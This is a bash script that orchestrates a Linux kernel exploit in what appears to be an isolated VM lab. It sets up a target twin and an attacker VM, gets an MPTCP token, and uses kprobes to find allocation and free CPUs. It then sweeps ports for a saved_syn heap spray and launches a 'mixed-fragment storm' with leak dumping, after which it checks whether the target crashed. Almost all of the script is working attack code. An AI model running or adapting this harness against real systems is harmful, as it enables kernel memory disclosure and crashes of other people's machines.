#!/bin/bash
# mixed-verify.sh [runtime_s] [spray_src] - per-boot mixed-fragment exploit run.
#
# Assumes the isolated stock twin (:2101, tap-cve-ins) is up on a matching
# random-kmalloc boot.  It:
#   1. configures the twin at 192.168.89.2 and starts :9800/:9801,
#   2. obtains a live MPTCP token via the attacker (:2224),
#   3. measures the flow CPU F (alloc/free) and L3 reader CPU L,
#   4. sweeps saved_syn source ports until one allocates on F,
#   5. disarms all probes and runs the mixed-fragment storm with the spray,
#      capturing all IP on the attacker with tcpdump.
#
# Evidence:  /tmp/mixed-<ts>.pcap (attacker), evidence/mixed-<ts>.trace (twin)
#            and lab/harness/instrumented-serial.log on a panic.
set -u
LAB=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
R=${1:-20}
SRC=${2:-192.67.68.69}
K=${MIX_K:-6}
PERIOD=${MIX_PERIOD:-300}
SP=${MIX_SPACING:-12}
TS=$(date +%s)
T="ssh -i $LAB/lab/ssh/id_ed25519 -p 2101 -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
   -o ConnectionAttempts=1 -o ControlMaster=no -o ControlPath=none \
   -o LogLevel=ERROR ubuntu@localhost"
A="ssh -i $LAB/lab/ssh/id_ed25519 -p 2224 -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
   -o ConnectionAttempts=1 -o ControlMaster=no -o ControlPath=none \
   -o LogLevel=ERROR ubuntu@localhost"

say() { echo "[*] $*"; }

say "configure twin 192.168.89.2 + listeners"
$T 'sudo mkdir -p /mnt/lab; sudo mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt/lab 2>/dev/null || true
    sudo ip link set ens4 up; sudo ip addr replace 192.168.89.2/24 dev ens4
    sudo sh /mnt/lab/lab/mq-config.sh ens4 >/dev/null 2>&1 || true
    sudo sh /mnt/lab/lab/start-listeners.sh' >/dev/null || { echo "[-] twin setup failed"; exit 1; }

say "match check"
$T 'sudo python3 -' < "$LAB/lab/cache_match_fixed.py" 2>&1 | sed 's/^/    /'

say "token"
$A 'sed "s#/tmp/mptcp_token#/tmp/mptcp_token89#" /mnt/lab/exp/mpsetup_remote.py > /tmp/mpsetup89.py 2>/dev/null; sudo rm -f /tmp/mptcp_token89
    sudo setsid nohup python3 /tmp/mpsetup89.py 192.168.89.2 9800 >/tmp/mpsetup89.log 2>&1 </dev/null & sleep 1' >/dev/null
TOK=
for i in $(seq 1 15); do
  TOK=$($A 'sudo cat /tmp/mptcp_token89 2>/dev/null' 2>/dev/null | tr -d '\r\n')
  [ -n "$TOK" ] && break; sleep 1
done
[ -z "$TOK" ] && { echo "[-] no token"; $A 'cat /tmp/mpsetup89.log'; exit 1; }
say "token=$TOK"

say "arm measurement probes (no spray)"
$T 'sudo bash -s' <<'EOS'
T=/sys/kernel/debug/tracing
mount -t debugfs none /sys/kernel/debug 2>/dev/null || true
echo 0 > $T/tracing_on
echo 0 > $T/events/kprobes/enable 2>/dev/null || true
echo 0 > $T/events/kmem/kmalloc/enable 2>/dev/null || true
echo > $T/kprobe_events 2>/dev/null || true
echo 8192 > $T/buffer_size_kb 2>/dev/null || true
echo 'p:freeopt inet_sock_destruct sk=%di:x64 inet_opt=+784(%di):x64' >> $T/kprobe_events
echo 'p:rdopt2 ip_options_build optlen=+8(%si):u8' >> $T/kprobe_events
echo 'bytes_req == 72' > $T/events/kmem/kmalloc/filter
echo 1 > $T/events/kmem/kmalloc/enable
echo 1 > $T/events/kprobes/enable
echo > $T/trace
echo 1 > $T/tracing_on
EOS

say "measure F/L (mixed, no spray, 1s)"
$A "sudo env MIXED_FRAG=1 MIX_K=$K MIX_PERIOD=$PERIOD FRAG_SYN=1 timeout 20 /mnt/lab/lab/bin/mpstorm3_mix 9800 $TOK 54502 1 $SP 1 0 10 192.168.89.1 30000000 192.168.89.2" >/dev/null 2>&1
MEAS=$($T 'sudo bash -c "T=/sys/kernel/debug/tracing; echo 0 > \$T/tracing_on
  echo -n F=; grep freeopt: \$T/trace | awk \"{match(\\\$0,/\\[[0-9]+\\]/); c=substr(\\\$0,RSTART+1,RLENGTH-2); n[c]++} END{m=0; for(k in n) if(n[k]>m){m=n[k];b=k} print b}\"
  echo -n L=; grep rdopt2: \$T/trace | awk \"{match(\\\$0,/\\[[0-9]+\\]/); c=substr(\\\$0,RSTART+1,RLENGTH-2); n[c]++} END{m=0; for(k in n) if(n[k]>m){m=n[k];b=k} print b}\"
  echo -n R72=; grep tcp_v4_route_req \$T/trace | awk \"{match(\\\$0,/\\[[0-9]+\\]/); c=substr(\\\$0,RSTART+1,RLENGTH-2); n[c]++} END{m=0; for(k in n) if(n[k]>m){m=n[k];b=k} print b}\""' 2>/dev/null)
echo "    $MEAS"
F=$(echo "$MEAS" | sed -n 's/^F=//p' | tr -d ' ')
L=$(echo "$MEAS" | sed -n 's/^L=//p' | tr -d ' ')
R72=$(echo "$MEAS" | sed -n 's/^R72=//p' | tr -d ' ')
[ -z "$F" ] && { echo "[-] could not measure F"; exit 1; }
say "F=$F L=$L victim_alloc=$R72"

say "swep spray ports for saved_syn alloc on F=$F (src $SRC)"
$T 'sudo bash -c "T=/sys/kernel/debug/tracing; echo 0 > \$T/tracing_on; echo 0 > \$T/events/kprobes/enable; echo 1024 > \$T/buffer_size_kb; echo \"bytes_req == 92\" > \$T/events/kmem/kmalloc/filter; echo 1 > \$T/events/kmem/kmalloc/enable"' >/dev/null
SPRAY=
for s in $(seq 53000 53063); do
  $T 'sudo bash -c "T=/sys/kernel/debug/tracing; echo 0 > \$T/tracing_on; echo > \$T/trace; echo 1 > \$T/tracing_on"' >/dev/null
  $A "sudo env FIXED=1 DELAY=0 SRC=$SRC DST=192.168.89.2 DPORT=9801 python3 /mnt/lab/exp/saved_syn_probe.py $s 1 >/dev/null 2>&1"
  sleep 0.04
  cpu=$($T 'sudo bash -c "T=/sys/kernel/debug/tracing; echo 0 > \$T/tracing_on; awk \"/tcp_reqsk_record_syn/{match(\\\$0,/\\[[0-9]+\\]/);print substr(\\\$0,RSTART+1,RLENGTH-2);exit}\" \$T/trace"' 2>/dev/null)
  if [ "$cpu" = "$F" ]; then SPRAY=$s; say "    port $s -> CPU $cpu"; break; fi
done
$T 'sudo bash -c "T=/sys/kernel/debug/tracing; echo 0 > \$T/tracing_on; echo 0 > \$T/events/kmem/kmalloc/enable"' >/dev/null
[ -z "$SPRAY" ] && { echo "[-] no spray port mapped to F=$F"; exit 1; }
say "spray_sport=$SPRAY"

say "FINAL RUN: no kprobes, mixed + spray, ${R}s"
$T 'sudo bash -c "T=/sys/kernel/debug/tracing; echo 0 > \$T/tracing_on; echo 0 > \$T/events/kprobes/enable; echo 0 > \$T/events/kmem/kmalloc/enable; echo > \$T/kprobe_events 2>/dev/null || true; echo cleared"' >/dev/null
$A "sudo setsid nohup timeout $((R+15)) tcpdump -i ens4 -nn -s0 -w /tmp/mixed-$TS.pcap ip >/tmp/tcpdump-$TS.log 2>&1 </dev/null & sleep 1; echo tcpdump"
$A "sudo env MIXED_FRAG=1 MIX_K=$K MIX_PERIOD=$PERIOD FRAG_SYN=1 LEAK_DUMP=1 SAVED_SYN_SPRAY=1 SPRAY_SRC=$SRC SPRAY_DPORT=9801 timeout $((R+10)) /mnt/lab/lab/bin/mpstorm3_mix 9800 $TOK 54502 $R $SP 1 $SPRAY 20 192.168.89.1 30000000 192.168.89.2" 2>&1 | grep -E 't\+|DONE|LEAK|cycling' | tail -6
$A 'sudo pkill -f "tcpdump -i ens4" 2>/dev/null || true'
sleep 1
if timeout 6 $T 'echo ALIVE' >/dev/null 2>&1; then
  echo "[=] target ALIVE after run"
else
  echo "[!] target went down after run"
  tail -5 "$LAB/lab/harness/instrumented-serial.log" 2>/dev/null
fi
$A "ls -l /tmp/mixed-$TS.pcap 2>/dev/null"
echo "[*] pcap /tmp/mixed-$TS.pcap on attacker; serial $LAB/lab/harness/instrumented-serial.log"
